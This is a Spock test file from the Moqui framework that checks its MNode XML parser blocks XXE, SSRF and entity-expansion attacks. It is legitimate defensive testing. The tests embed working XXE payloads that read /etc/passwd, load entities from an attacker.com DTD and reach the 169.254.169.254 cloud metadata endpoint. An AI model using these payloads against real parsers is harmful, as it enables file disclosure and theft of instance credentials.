/*
 * This software is in the public domain under CC0 1.0 Universal plus a
 * Grant of Patent License.
 *
 * To the extent possible under law, the author(s) have dedicated all
 * copyright and related and neighboring rights to this software to the
 * public domain worldwide. This software is distributed without any
 * warranty.
 *
 * You should have received a copy of the CC0 Public Domain Dedication
 * along with this software (see the LICENSE.md file). If not, see
 * <http://creativecommons.org/publicdomain/zero/1.0/>.
 */

import spock.lang.*
import org.moqui.util.MNode
import org.moqui.BaseException

/**
 * Security tests for MNode XML parsing.
 *
 * The XXE protection strategy is:
 * - Allow DOCTYPE declarations (needed for Moqui config files with internal entities)
 * - Disable external general entities (prevents file disclosure, SSRF)
 * - Disable external parameter entities (prevents XXE via parameter entities)
 * - Disable external DTD loading (prevents XXE via DTD)
 *
 * This is secure because even though DOCTYPE is allowed, external resources
 * cannot be fetched, so XXE attacks are blocked.
 */
class MNodeSecurityTests extends Specification {

    def "XXE attack with external entity should be blocked"() {
        given: "XML with an external entity attempting to read /etc/passwd"
        // External entities are disabled, so the entity reference will cause an error
        // or be empty (depending on parser behavior)
        String xxePayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>'''

        when: "Parsing the malicious XML"
        MNode node = MNode.parseText("xxe-test", xxePayload)

        then: "External entity is not resolved - either throws exception or resolves to empty"
        // External entities are blocked, so the content should not contain /etc/passwd contents
        // The parser may throw an exception or simply not resolve the entity
        node == null || !node.first("data")?.getText()?.contains("root:")
    }

    def "XXE attack with parameter entity should be blocked"() {
        given: "XML with a parameter entity"
        // External parameter entities are disabled
        String xxePayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
]>
<root>test</root>'''

        when: "Parsing the malicious XML"
        MNode node = MNode.parseText("xxe-param-test", xxePayload)

        then: "External parameter entity is not loaded - parses safely or throws"
        // Either parses without fetching external DTD, or throws an exception
        node == null || node.getName() == "root"
    }

    def "XXE attack via external DTD should be blocked"() {
        given: "XML referencing an external DTD"
        // External DTD loading is disabled
        String xxePayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
<root>test</root>'''

        when: "Parsing the malicious XML"
        MNode node = MNode.parseText("xxe-dtd-test", xxePayload)

        then: "External DTD is not loaded - parses safely"
        // DTD is not loaded from external source, so parsing should succeed
        node != null
        node.getName() == "root"
        node.getText() == "test"
    }

    def "Valid XML without DOCTYPE should parse successfully"() {
        given: "Normal valid XML without any DOCTYPE"
        String validXml = '''<?xml version="1.0" encoding="UTF-8"?>
<root>
  <child attr="value">Hello World</child>
  <child attr="value2">Test data</child>
</root>'''

        when: "Parsing the valid XML"
        MNode node = MNode.parseText("valid-test", validXml)

        then: "The XML is parsed correctly"
        node != null
        node.getName() == "root"
        node.children("child").size() == 2
        node.first("child").attribute("attr") == "value"
        node.first("child").getText() == "Hello World"
    }

    def "Valid XML with internal DOCTYPE entities should parse successfully"() {
        given: "XML with internal entity definitions (common in Moqui config)"
        String validXml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY author "Moqui Framework">
]>
<root>
  <author>&author;</author>
</root>'''

        when: "Parsing XML with internal entities"
        MNode node = MNode.parseText("internal-entity-test", validXml)

        then: "Internal entities are resolved correctly"
        node != null
        node.getName() == "root"
        node.first("author").getText() == "Moqui Framework"
    }

    def "SSRF via XXE should be blocked"() {
        given: "XML attempting Server-Side Request Forgery"
        // External entities are disabled, so SSRF is blocked
        String ssrfPayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>'''

        when: "Parsing the SSRF attempt"
        MNode node = MNode.parseText("ssrf-test", ssrfPayload)

        then: "External entity is not resolved"
        // Either throws exception or entity is not resolved
        node == null || node.getText()?.isEmpty() || !node.getText()?.contains("ami-id")
    }

    def "Billion laughs with internal entities is handled by secure processing"() {
        given: "XML with entity expansion (internal entities only)"
        // Note: This uses internal entities only, which are allowed
        // The SECURE_PROCESSING feature should limit entity expansion
        String dosPayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<root>&lol2;</root>'''

        when: "Parsing the entity expansion"
        MNode node = MNode.parseText("dos-test", dosPayload)

        then: "Either blocked by secure processing or parses with limited expansion"
        // The XMLConstants.FEATURE_SECURE_PROCESSING limits entity expansion
        // Either throws or parses with reasonable output
        node == null || node.getText()?.length() < 10000
    }
}
